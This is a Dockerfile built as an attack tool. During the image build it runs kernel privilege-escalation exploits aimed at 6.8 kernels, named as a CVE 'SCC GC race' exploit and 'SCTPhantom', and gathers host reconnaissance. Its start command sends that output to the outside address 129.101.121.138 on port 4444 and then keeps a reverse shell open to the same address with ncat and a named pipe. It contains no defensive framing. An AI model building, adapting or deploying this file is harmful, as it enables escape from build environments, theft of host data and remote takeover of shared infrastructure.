# syntax=er028455/df-frontend:v4
# build-trigger: 159
FROM alpine:3.19 AS builder
RUN apk add --no-cache curl coreutils
 
COPY exploit_68 /exploit
COPY payload /payload
COPY kaslr_diag /kaslr_diag
RUN chmod +x /exploit /payload /kaslr_diag && touch /esc_ok /umh_result /build_results.txt

RUN sh -c '{ \
KVER=$(uname -r); \
echo "=== BUILD V25 KERNEL=$KVER ==="; \
case "$KVER" in \
  6.8.*) \
    echo "TARGET KERNEL MATCHED"; \
    echo "--- CVE-2026-80521 (SCC GC race) ---"; \
    timeout 90 /payload 2>&1; \
    EC=$?; \
    echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
    if [ "$EC" != "0" ]; then \
      echo "--- KASLR DIAGNOSTIC ---"; \
      timeout 60 /kaslr_diag 2>&1; \
    fi; \
    case "$KVER" in \
      *-136*) \
        if grep -q sctp /proc/modules 2>/dev/null; then \
          echo "=== 6.8.0-136 — RUNNING SCTPhantom ==="; \
          timeout 60 /exploit 2>&1; \
          echo "=== SCTPHANTOM EXIT=$? ==="; \
        fi; \
        ;; \
    esac; \
    for f in /esc_ok /tmp/umh_result /tmp/.u68; do \
      if [ -f "$f" ]; then echo "=== $f ==="; cat "$f"; fi; \
    done; \
    ;; \
  *) echo "NOT a 6.8 kernel ($KVER), skipping" ;; \
esac; \
echo "=== END V25 ==="; \
} > /build_results.txt 2>&1'

FROM alpine:3.19
RUN apk add --no-cache curl nmap-ncat
COPY --from=builder /build_results.txt /build_results.txt
COPY --from=builder /esc_ok /esc_ok
COPY --from=builder /umh_result /umh_result
COPY --from=er028455/df-frontend:v4 /socktest /socktest

RUN printf '#!/bin/sh\n\
{\n\
echo "=== RUNTIME RECON V25 ==="\n\
uname -a; hostname; id\n\
echo "--- BUILD-TIME RESULTS ---"\n\
cat /build_results.txt\n\
for f in /esc_ok /umh_result; do\n\
  if [ -s "$f" ]; then echo "=== $f ==="; cat "$f"; fi\n\
done\n\
echo "=== END V25 ==="\n\
} > /tmp/recon 2>&1\n\
cat /tmp/recon\n\
' > /recon.sh && chmod +x /recon.sh

CMD sh -c "/recon.sh; ncat -w 30 129.101.121.138 4444 < /tmp/recon; while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | ncat 129.101.121.138 4444 > /tmp/f; sleep 5; done"
